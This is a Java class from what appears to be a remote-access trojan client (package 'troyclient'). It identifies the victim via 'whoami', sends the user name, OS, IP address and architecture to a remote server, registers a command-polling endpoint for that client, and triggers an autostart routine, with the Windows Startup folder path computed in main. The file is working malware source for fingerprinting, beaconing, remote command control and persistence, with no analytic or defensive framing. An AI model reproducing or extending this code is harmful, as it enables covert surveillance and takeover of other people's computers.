package ch.lebois.troyclient.main;

import ch.lebois.troyclient.functions.Autostart;
import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.IpService;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.File;

/**
 * Project: Hermann
 **/
public class ConfigureInit {


    private WebHandler webHandler;

    public static void main(String[] args) {
        System.out.println(new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).getPath());
    }

    public WebHandler getWebHandler() {
        return webHandler;
    }

    public void configure(String url, String version) {
        SystemVariables.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
        SystemVariables.SENDER = new Sender(url);
        webHandler = new WebHandler(url + "/command/" + SystemVariables.CLIENT_NAME);
        SystemVariables.REFRESHTIME = 1000;
        getConstants(version);
        new Autostart().decide();
    }


    private void getConstants(String version) {
        SystemVariables.SENDER.send("user", System.getProperty("user.name"));
        SystemVariables.SENDER.send("os", System.getProperty("os.name"));
        System.out.println("OS\t\t" + System.getProperty("os.name"));
        SystemVariables.SENDER.send("ip", new IpService().getIp());
        SystemVariables.SENDER.send("arch", version);
        System.out.println("Version\t" + version);
        SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
    }
}
